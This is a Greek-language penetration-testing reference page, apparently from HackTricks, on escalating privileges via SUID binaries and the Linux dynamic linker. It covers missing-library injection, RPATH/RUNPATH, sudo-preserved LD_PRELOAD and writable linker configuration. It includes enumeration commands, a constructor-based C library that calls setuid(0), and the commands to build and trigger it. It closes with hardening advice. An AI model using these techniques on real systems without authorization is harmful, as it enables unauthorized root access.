# SUID Shared Library and Linker Abuse

Τα SUID binaries συνήθως ελέγχονται για άμεση εκτέλεση εντολών, αλλά τα custom SUID προγράμματα μπορεί επίσης να είναι ευάλωτα μέσω του dynamic linker. Το κοινό μοτίβο είναι απλό: ένα privileged executable φορτώνει κώδικα από ένα path ή configuration που μπορεί να επηρεάσει ένας χρήστης με χαμηλότερα privileges.<sup>[[1]](#references)</sup>

Αυτή η σελίδα εστιάζει σε generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` μέσω sudo, linker configuration και SUID hardlink confusion.

## Fast Enumeration

Ξεκινήστε εντοπίζοντας ασυνήθιστα SUID files και ελέγχοντας αν είναι dynamically linked:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Εστιάστε σε μη τυπικές τοποθεσίες, προσαρμοσμένες διαδρομές εφαρμογών, binaries που ανήκουν στον root αλλά βρίσκονται εκτός καταλόγων που διαχειρίζονται πακέτα και dependencies που φορτώνονται από εγγράψιμους καταλόγους.<sup>[[1]](#references)</sup>

Χρήσιμοι έλεγχοι δυνατότητας εγγραφής:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Ορισμένα custom SUID binaries προσπαθούν να φορτώσουν ένα shared object που δεν υπάρχει. Αν το path που λείπει βρίσκεται κάτω από έναν κατάλογο που ελέγχεται από τον attacker, το binary μπορεί να φορτώσει code που παρέχεται από τον attacker ως ο effective user.<sup>[[1]](#references)</sup>

Εντοπίστε αποτυχημένες αναζητήσεις libraries με το syscall filter του `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Εάν το binary αναζητά μια εγγράψιμη διαδρομή για το `libexample.so`, μια minimal βιβλιοθήκη proof μπορεί να χρησιμοποιήσει έναν constructor. Διατηρήστε το proof-of-impact harmless κατά την επικύρωση:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Δημιουργήστε το με ακριβώς το όνομα αρχείου που προσπαθεί να φορτώσει το binary:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Η εκμεταλλεύσιμη συνθήκη δεν είναι μόνο η βιβλιοθήκη που λείπει. Ο attacker πρέπει να μπορεί να τοποθετήσει ένα συμβατό shared object σε μια διαδρομή που ο privileged loader θα αποδεχτεί.<sup>[[1]](#references)</sup>

## Εγγράψιμος Κατάλογος Βιβλιοθηκών

Μερικές φορές όλες οι dependencies υπάρχουν, αλλά ένας από τους καταλόγους που χρησιμοποιούνται για την επίλυσή τους είναι εγγράψιμος. Αυτό μπορεί να επιτρέψει την αντικατάσταση μιας βιβλιοθήκης που έχει φορτωθεί ή την τοποθέτηση μιας βιβλιοθήκης υψηλότερης προτεραιότητας με το ίδιο όνομα.<sup>[[1]](#references)</sup>

Ελέγξτε τις διαδρομές των dependencies:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Εάν ο κατάλογος είναι writable, επικυρώστε το με μια copy-safe προσέγγιση σε lab. Η αντικατάσταση system libraries σε live host μπορεί να αφήσει διεργασίες που ξεκινούν ταυτόχρονα με ασυνεπείς εκδόσεις libraries.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

Τα `RPATH` και `RUNPATH` είναι entries του dynamic section που υποδεικνύουν στον loader πού να αναζητήσει libraries. Είναι επικίνδυνα σε SUID programs όταν δείχνουν σε directories που είναι writable από attacker.<sup>[[1]](#references)</sup>

Εντοπίστε τα:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Παράδειγμα επικίνδυνου output:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Εάν το `/opt/app/lib` είναι writable και το binary χρειάζεται το `libcustom.so`, ο attacker μπορεί να είναι σε θέση να τοποθετήσει εκεί ένα malicious `libcustom.so`:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
Το `RPATH` και το `RUNPATH` δεν είναι πανομοιότυπα σε όλες τις λεπτομέρειες ανάλυσης, αλλά για τον έλεγχο privilege-escalation το πρακτικό ερώτημα είναι το ίδιο: αναζητά το SUID binary ένα library name σε directory με δυνατότητα εγγραφής από τον attacker;<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH και SUID

Για τα normal programs, τα `LD_PRELOAD` και `LD_LIBRARY_PATH` μπορούν να επιβάλουν ή να επηρεάσουν τη φόρτωση shared objects. Για τα SUID programs, ο dynamic loader κανονικά εισέρχεται σε secure-execution mode και αγνοεί τα dangerous environment variables.<sup>[[1]](#references)</sup>

Αυτό σημαίνει ότι ένα plain SUID binary συνήθως δεν είναι vulnerable απλώς επειδή ο user μπορεί να ορίσει το `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Η συνήθης εξαίρεση είναι μια πολιτική sudo που επιτρέπει τον ορισμό ή τη διατήρηση μεταβλητών του loader για την εντολή-στόχο. Ελέγξτε το `sudo -l` για καταχωρίσεις όπως `env_keep+=LD_PRELOAD` ή `env_keep+=LD_LIBRARY_PATH`. Αν ο στόχος είναι dynamically linked, ενδέχεται να φορτώσει κώδικα ελεγχόμενο από τον attacker:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Μην συγχέετε αυτές τις περιπτώσεις· οι κανόνες του loader και του sudo policy παραπάνω τις διακρίνουν:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` απέναντι σε ένα κανονικό SUID binary: συνήθως αποκλείεται από το secure execution.
- `LD_PRELOAD` που διατηρείται από το sudo: δυνητικά exploitable.
- Απουσία `.so` σε writable path: exploitable όταν το SUID binary φορτώνει φυσικά αυτό το path.
- `RPATH`/`RUNPATH` προς writable directory: exploitable όταν είναι δυνατός ο έλεγχος μιας απαιτούμενης library.
- Πρόσβαση εγγραφής στο `/etc/ld.so.preload` ή στη linker config: επηρεάζει όλο το σύστημα και έχει υψηλό impact.

## Ρύθμιση Linker

Το `ld.so` χρησιμοποιεί το linker cache και το `/etc/ld.so.preload`· το `ldconfig` δημιουργεί αυτό το cache από το `/etc/ld.so.conf` και τα αρχεία που περιλαμβάνονται από αυτό, συνήθως από το `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Έλεγχοι υψηλής αξίας:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Η εγγράψιμη ρύθμιση του linker είναι συνήθως πιο σοβαρή από ένα μεμονωμένο ευάλωτο SUID binary, επειδή μπορεί να επηρεάσει πολλές dynamically linked processes. Το `/etc/ld.so.preload` είναι ιδιαίτερα επικίνδυνο, επειδή μπορεί να επιβάλει τη φόρτωση ενός shared object σε privileged processes.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Τα hardlinks μπορούν να κάνουν το ίδιο SUID inode να εμφανίζεται με πολλά ονόματα.<sup>[[9]](#references)</sup> Αυτό είναι χρήσιμο για την απόκρυψη ενός privileged helper, την παραπλάνηση διαδικασιών cleanup ή την παράκαμψη ενός αφελούς ελέγχου που βασίζεται σε paths.

Εντοπίστε αρχεία SUID με περισσότερα από ένα links:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ελέγξτε όλες τις διαδρομές προς το ίδιο inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Η κατάχρηση δεν συνίσταται στο ότι ένα hardlink αλλάζει permissions. Η κατάχρηση είναι το path confusion: ένα privileged inode μπορεί να είναι προσβάσιμο μέσω ενός ονόματος που οι defenders ή τα scripts δεν αναμένουν.<sup>[[9]](#references)</sup> Για βαθύτερη κατανόηση του workflow των inode και hardlink, δείτε το [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Αμυντικές σημειώσεις

- Διατηρείτε τα SUID binaries ελάχιστα, ελεγμένα και υπό διαχείριση package όπου είναι δυνατό.
- Αποφεύγετε καταχωρίσεις `RPATH`/`RUNPATH` που δείχνουν σε directories με δυνατότητα εγγραφής ή υπό διαχείριση εφαρμογών.<sup>[[1]](#references)[[8]](#references)</sup>
- Διατηρείτε τα directories των libraries υπό ιδιοκτησία του root και χωρίς δυνατότητα εγγραφής από regular users.<sup>[[8]](#references)</sup>
- Μην διατηρείτε τα `LD_PRELOAD`, `LD_LIBRARY_PATH` ή παρόμοιες μεταβλητές του loader μέσω του sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Παρακολουθείτε τα `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` και απρόσμενα SUID files.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Ελέγχετε SUID files με hardlink και διερευνάτε custom SUID wrappers εκτός των standard system paths.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (Βοηθητικά προγράμματα δυαδικών αρχείων GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — σελίδα εγχειριδίου Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening Dynamic Linker (Η βιβλιοθήκη GNU C)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (Βοηθητικά προγράμματα δυαδικών αρχείων GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
